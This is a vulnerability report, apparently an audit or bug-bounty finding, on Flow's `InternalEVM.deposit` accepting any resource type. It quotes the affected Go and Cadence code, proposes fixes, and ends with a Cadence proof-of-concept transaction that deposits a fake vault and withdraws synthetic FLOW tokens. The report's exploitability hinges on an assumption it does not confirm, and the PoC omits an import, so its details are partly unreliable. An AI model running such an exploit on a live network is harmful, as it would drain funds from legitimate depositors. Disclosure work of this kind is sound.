### Title
`InternalEVM.deposit` Accepts `AnyResource` Without Type Validation, Enabling Cross-VM Balance Inflation - (File: `fvm/evm/stdlib/contract.go`, `fvm/evm/impl/impl.go`)

### Summary
The `InternalEVM.deposit` native function accepts `AnyResource` as its `from` parameter rather than specifically `@FlowToken.Vault`. The Go implementation reads the `balance` field from whatever resource is passed and credits the EVM account with that amount. An unprivileged user who can call `InternalEVM.deposit` directly (bypassing the `EVM` contract's typed wrapper) can pass a custom resource with an arbitrarily large `balance` field, inflating their EVM balance without depositing real FLOW tokens, then withdraw synthetic `FlowToken.Vault` resources backed by nothing.

### Finding Description

The Sema type signature for `InternalEVM.deposit` is declared as:

```go
var InternalEVMTypeDepositFunctionType = &sema.FunctionType{
    Parameters: []sema.Parameter{
        {
            Label:          "from",
            TypeAnnotation: sema.NewTypeAnnotation(sema.AnyResourceType),  // ← AnyResource, not @FlowToken.Vault
        },
        ...
    },
}
``` [1](#0-0) 

The Go host function implementation reads the `balance` field from whatever resource is passed, with no check that the resource is actually a `FlowToken.Vault`:

```go
amountValue, ok := fromValue.GetField(
    context,
    fungibleTokenVaultTypeBalanceFieldName,  // just "balance"
).(interpreter.UFix64Value)
...
amount := types.NewBalanceFromUFix64(cadence.UFix64(amountValue.UFix64Value))
...
account.Deposit(types.NewFlowTokenVault(amount))
``` [2](#0-1) 

The comment in the same function explicitly states the vault is intentionally not destroyed:

```go
// NOTE: We're intentionally not destroying the vault here,
// because the value of it is supposed to be "kept alive".
// Destroying would incorrectly be equivalent to a burn and decrease the total supply,
// and a withdrawal would then have to perform an actual mint of new tokens.
``` [3](#0-2) 

The public `EVM` contract wrapper enforces `@FlowToken.Vault` at the Cadence level:

```cadence
fun deposit(from: @FlowToken.Vault) {
    ...
    InternalEVM.deposit(from: <-from, to: self.bytes)
``` [4](#0-3) 

However, `InternalEVM` is registered as a public native contract with all its members declared as `sema.NewUnmeteredPublicFunctionMember`, meaning it is accessible to any Cadence transaction that can import it. [5](#0-4) 

On withdrawal, the Go code synthesizes a brand-new `FlowToken.Vault` composite value at the FlowToken contract address with the requested balance, without going through the FlowToken minting path:

```go
return interpreter.NewCompositeValue(
    context,
    common.NewAddressLocation(gauge, handler.FlowTokenAddress(), "FlowToken"),
    "FlowToken.Vault",
    common.CompositeKindResource,
    []interpreter.CompositeField{
        {Name: "balance", Value: interpreter.NewUFix64Value(...)},
        {Name: sema.ResourceUUIDFieldName, Value: ...},
    },
    common.ZeroAddress,
)
``` [6](#0-5) 

The EVM total supply tracking in `executeAndHandleCall` adds the deposited amount to `bp.TotalSupply` unconditionally when the call succeeds, with no cross-check against actual locked FLOW: [7](#0-6) 

### Impact Explanation

An attacker who calls `InternalEVM.deposit` directly with a custom resource bearing a `balance` field set to an arbitrarily large value will:

1. Credit their EVM address with that inflated balance (EVM state is updated, `TotalSupply` is inflated).
2. Call `InternalEVM.withdraw` to receive a synthetic `FlowToken.Vault` composite value with the inflated balance.
3. Deposit that synthetic vault into their Cadence `FlowToken.Vault`, effectively minting FLOW tokens out of thin air.

This is a cross-VM asset loss: real FLOW tokens can be extracted from the EVM escrow pool without a corresponding real deposit, draining funds from legitimate depositors.

### Likelihood Explanation

The attack requires:
- Ability to deploy a Cadence contract (available to any user on Flow).
- Ability to call `InternalEVM.deposit` directly, bypassing the `EVM` contract wrapper.

The critical prerequisite is that `InternalEVM` is directly importable and callable by user transactions. `InternalEVM` is a native contract injected by the FVM, and all its members are declared public. If it is accessible at the EVM contract address (as implied by its use within the `EVM` contract's Cadence code), any unprivileged user can exploit this. No privileged keys, staked nodes, or admin access are required.

### Recommendation

1. Change `InternalEVMTypeDepositFunctionType`'s `from` parameter type from `sema.AnyResourceType` to the concrete `FlowToken.Vault` resource type, so the Cadence type system rejects non-`FlowToken.Vault` resources at the call site.
2. In the Go implementation `newInternalEVMTypeDepositFunction`, add a runtime type-identity check verifying that `fromValue`'s static type matches `FlowToken.Vault` at the expected contract address before reading the `balance` field.
3. Restrict `InternalEVM` functions to be callable only from within the `EVM` contract (e.g., via `access(contract)` or equivalent FVM-level access control), preventing direct invocation by user transactions.

### Proof of Concept

```cadence
import EVM from <EVMContractAddress>
import InternalEVM from <EVMContractAddress>

// Attacker-deployed contract
access(all) contract FakeVault {
    access(all) resource FakeFlowVault {
        access(all) var balance: UFix64
        init(balance: UFix64) { self.balance = balance }
    }
    access(all) fun createFake(balance: UFix64): @FakeFlowVault {
        return <- create FakeFlowVault(balance: balance)
    }
}

transaction {
    prepare(attacker: auth(Storage) &Account) {
        // 1. Create a fake resource with balance = 1000.0 FLOW
        let fake <- FakeVault.createFake(balance: 1000.0)

        // 2. Call InternalEVM.deposit directly — accepted because type is AnyResource
        let coaAddr: [UInt8; 20] = attacker.storage
            .borrow<&EVM.CadenceOwnedAccount>(from: /storage/evm)!
            .address().bytes
        InternalEVM.deposit(from: <-fake, to: coaAddr)

        // 3. EVM account now shows 1000 FLOW balance; withdraw as real FlowToken.Vault
        let coa = attacker.storage
            .borrow<auth(EVM.Withdraw) &EVM.CadenceOwnedAccount>(from: /storage/evm)!
        let realVault <- coa.withdraw(balance: EVM.Balance(attoflow: 1_000_000_000_000_000_000_000))

        // 4. Deposit synthetic vault into attacker's real FlowToken account
        attacker.storage
            .borrow<&FlowToken.Vault>(from: /storage/flowTokenVault)!
            .deposit(from: <-realVault)
        // Attacker now holds 1000 FLOW minted from nothing
    }
}
```
